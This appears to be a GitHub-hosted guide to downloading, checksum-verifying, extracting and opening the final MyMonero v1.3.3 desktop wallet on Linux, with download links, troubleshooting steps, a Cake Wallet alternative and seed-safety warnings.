<p align="center"><img src="https://github.com/monero-projects/learn/raw/HEAD/assets/banner-article.png" alt="MyMonero article banner" width="100%"></p>

<h1 align="center">Install MyMonero on Linux</h1>
<p align="center">Get the final Linux desktop release and open it with care.</p>

<p align="center">
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe"><img src="https://img.shields.io/badge/Download_for_Windows-00C6FF?style=for-the-badge&logo=windows&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Windows"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg"><img src="https://img.shields.io/badge/Download_for_macOS-00C6FF?style=for-the-badge&logo=apple&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for macOS"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip"><img src="https://img.shields.io/badge/Download_for_Linux-00C6FF?style=for-the-badge&logo=linux&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Linux"></a>
</p>

| Platform | File | Version |
|---|---|---|
| Windows | [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe) | v1.3.3 |
| macOS | [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg) | v1.3.3 |
| Linux | [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip) | v1.3.3 |

All versions and checksums are on the [MyMonero v1.3.3 release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3).

## Short answer
The final MyMonero desktop release is v1.3.3, distributed for Linux as a ZIP archive on the project’s GitHub release page. Extract the archive, check the downloaded file’s SHA-256 against the release page, then launch the included application using the instructions bundled with that release.

## You'll see this if
- You are looking for a Linux installer and find a ZIP rather than a package manager entry.
- The download has finished, but you are unsure whether it is the correct release.
- Your desktop environment asks whether to run a file or open it in an archive tool.
- The app launches but does not show a current balance immediately.
- You are considering another way to access your existing wallet.

## Why it happens
MyMonero’s final desktop release is v1.3.3. The release page lists Windows as an .exe, macOS as a .dmg, and Linux as a .zip. It is a desktop application distribution, not a promise of a current Linux package or ongoing update channel. The old app still opens wallets and sends XMR, but it is no longer maintained and receives no new features or security updates. The MyMonero hosted servers and web wallet login stopped, so do not expect the former web experience or hosted login to work.

A ZIP is an archive containing the application files. Linux distributions and desktop environments can differ in how they display executable files, permissions, and security prompts. Therefore, a particular button label or terminal command may not match every system. Use the release’s included documentation where available, and avoid instructions from unrelated download sites. For context on the available desktop build, see [the MyMonero desktop release](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3) and [the app repository](https://github.com/monero-projects/mymonero-desktop-wallet).

---

## Fix
1. **Use the project release page.** Open the MyMonero desktop wallet release on GitHub and locate v1.3.3. Confirm that the file is the Linux ZIP, not a Windows executable or macOS disk image. Avoid search ads, mirrors, and unsolicited messages offering a “new” MyMonero installer.
2. **Download the archive completely.** Keep the original ZIP until you have finished checking and extracting it. If the browser reports an incomplete download, remove that partial file and download again from the release page.
3. **Check file integrity.** Compare the ZIP’s SHA-256 with the value shown on the GitHub release page. On Linux, open a terminal in the download folder and run `sha256sum <file>`, replacing `<file>` with the actual archive filename. The command prints a digest; compare the entire value carefully. If it differs, do not run the archive. Download it again from the release page and repeat the check. More background is in [how to verify a MyMonero download](./verify-mymonero-download-sha256.md).
4. **Extract the ZIP.** Use your file manager’s Extract option or an archive utility. Extract into a folder you can find again, rather than running files directly from the archive preview. Do not change file contents or retrieve replacement libraries from an unknown site.
5. **Read the bundled instructions.** Find any release notes or readme in the extracted folder. Follow the package’s own launch guidance. The exact way to mark a file executable or start it depends on the desktop environment and archive contents; do not assume a generic command applies to every Linux setup.
6. **Open the application.** If your desktop shows a permission or trust prompt, pause and confirm you extracted the expected release and completed the integrity check. Do not bypass a warning just because an online post says to. If the app opens, restore or open your wallet using information you already control.
7. **Allow for wallet scanning.** A balance can take time to appear while the wallet scans from its restore height. A restore height is the block height from which scanning starts. An earlier height is safer when uncertain but takes longer. See [restore height explained](./mymonero-restore-height-explained.md) for the trade-off.

> [!WARNING]
> Never enter your seed or private keys into a website, support form, or message. Nobody legitimate needs your seed to help install a desktop app. Check that recovery instructions are for the wallet you intend to use before entering sensitive information.

## If that did not work
If the archive’s checksum does not match the value on the release page, stop. Do not try to repair, rename, or execute the file. Re-download the Linux ZIP from the official release page and compare again. If a second clean download still differs, leave it unused and check the release page directly for any clarification.

If extraction fails, check that the download completed and that you have enough disk space. Try extracting a fresh copy with your system’s normal archive utility. Do not install a random “codec,” script, or replacement package offered by a pop-up to make the archive work.

If the application does not start, note the exact message and when it appears. Check the included release notes and your system’s ordinary application logs or help resources. Avoid sharing wallet files or credentials when asking for general Linux troubleshooting. An error 523 is general guidance that the server connection is unavailable; it is not a reason to disclose a seed or install another download.

If the desktop build does not fit your needs, the other option described here is restoring the seed in Cake Wallet. Cake Wallet runs on iOS, Android, macOS, and Linux; Windows desktop builds are paused at the time of writing. Compare the recovery options before moving funds. A seed restore and a sweep are different actions: sweeping sends all funds to a new wallet. Read [the MyMonero migration checklist](./mymonero-migration-checklist.md) before making changes.

## Prevention
Keep a verified copy of the original release and its checksum reference, and record which release you obtained. Maintain a secure, offline backup of your seed before relying on any device. Make sure the backup is readable and stored privately; do not upload it to cloud notes, email it, or photograph it for a public gallery. Store the seed separately from your device where practical, and protect it from loss, fire, and unauthorized access.

Download wallet software only from the project’s release page, and re-check the destination before downloading. Treat unexpected requests to “validate,” “synchronize,” or “unlock” a wallet by entering a seed as scams. Use [safe seed backup practices](./mymonero-backup-seed-safely.md) and keep the [MyMonero seed types](./mymonero-seed-13-vs-25-words.md) in mind when preparing recovery.

## FAQ
<details><summary>Is there a newer maintained Linux MyMonero release?</summary>

The final desktop release is v1.3.3. The old app is no longer maintained and has no new features or security updates.

</details>

<details><summary>Why is the Linux download a ZIP?</summary>

The final release distributes Linux as a ZIP archive. Extract it and follow the instructions included with that release.

</details>

<details><summary>Can I still open my wallet with the desktop app?</summary>

The old app still opens wallets and sends XMR, although hosted MyMonero services and web wallet login stopped.

</details>

<details><summary>What should I do if I cannot use the desktop build?</summary>

You can consider restoring your seed in Cake Wallet, after confirming you have the correct seed and understanding the restore process. Never share it with anyone.

</details>

---

## Download MyMonero

- Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
- macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
- Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)

Check each file against the checksums on the [MyMonero v1.3.3 release](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3) before you install it.

## Related articles

| Article | Topic |
|---|---|
| [Verify a MyMonero Download with SHA-256](./verify-mymonero-download-sha256.md) | Compare the file you downloaded with the release page before opening it. |
| [How to Use MyMonero Desktop](./how-to-use-mymonero-desktop.md) | What the final desktop app can still do, and how to use it with care. |
| [Send XMR with MyMonero](./mymonero-send-xmr.md) | Verify the recipient, amount, and fee before confirming a transaction. |

[Back to all MyMonero guides](https://github.com/monero-projects/learn)
